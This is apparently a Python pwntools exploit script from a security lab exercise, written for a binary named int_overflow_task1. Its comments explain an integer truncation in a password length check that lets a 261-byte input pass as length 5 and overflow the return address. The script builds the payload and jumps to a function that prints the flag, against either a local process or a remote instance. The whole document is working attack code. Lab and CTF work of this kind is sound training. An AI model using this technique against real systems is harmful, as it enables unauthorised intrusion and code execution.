#!/usr/bin/env python3
# 实验二 3.1.4 int_overflow_task1 exp
# 漏洞：check_passwd() 里 strlen() 的 size_t 结果被截断进 unsigned char，
#       长度 261 变成 5，绕过 4<=len<=8 的校验，strcpy 溢出返回地址。
# 利用：NX 开启，但程序里自带 what_is_this() -> system("cat flag")，直接 ret2win。
from pwn import *
import sys

context(arch='i386', os='linux', log_level='info')

D    = '/home/xlj/pwn/task1'
BIN  = D + '/int_overflow_task1'
WIN  = 0x804868b          # what_is_this
OFF  = 24                 # passwd_buf 到返回地址的偏移（cyclic 实测）

def start():
    # python3 exp_task1.py 172.28.52.12 30001  -> 打远程实例
    if len(sys.argv) == 3:
        return remote(sys.argv[1], int(sys.argv[2]))
    return process(BIN, cwd=D)

def build_payload():
    payload  = b'A' * OFF + p32(WIN)
    payload  = payload.ljust(260, b'B')   # 再加 sendline 的 '\n' = 261, 261&0xff=5 通过校验
    assert len(payload) + 1 == 261
    return payload

def exploit():
    p = start()
    p.recvuntil(b'Your choice:')
    p.sendline(b'1')
    p.recvuntil(b'username:')
    p.sendline(b'admin')
    p.recvuntil(b'passwd:')
    p.sendline(build_payload())
    return p.recvall(timeout=5)

if __name__ == '__main__':
    out = exploit()
    print('=== 程序输出 ===')
    print(out.decode(errors='replace'))
